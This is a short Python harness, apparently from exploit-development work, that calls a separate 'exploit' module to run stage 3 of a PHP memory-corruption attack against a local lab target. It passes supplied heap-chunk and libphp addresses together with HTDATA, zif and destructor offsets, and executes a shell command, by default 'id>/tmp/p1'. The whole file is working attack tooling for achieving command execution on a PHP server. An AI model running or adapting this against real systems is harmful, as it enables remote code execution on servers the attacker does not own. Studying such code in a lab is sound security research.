#!/usr/bin/env python3
"""Try one stage-3 HTDATA offset against the local Ubuntu 8.5.4 lab."""

import argparse

import exploit


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1/index.php")
    parser.add_argument("--chunk", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--libphp", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--htdata-offset", type=lambda value: int(value, 0), required=True)
    parser.add_argument("--zif-offset", type=lambda value: int(value, 0), default=0x3DDA90)
    parser.add_argument("--cmd", default="id>/tmp/p1")
    parser.add_argument("--timeout", type=float, default=40.0)
    args = parser.parse_args()

    target = exploit.Target(args.url, timeout=args.timeout, verbose=True)
    ex = exploit.Exploit(
        target,
        args.cmd,
        zif_offset=args.zif_offset,
        dtor_offset=0x5E8DC0,
        htdata_offset=args.htdata_offset,
        profile="bookworm",
        verbose=True,
    )
    ex.stage3(args.chunk + args.htdata_offset, args.libphp + args.zif_offset)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
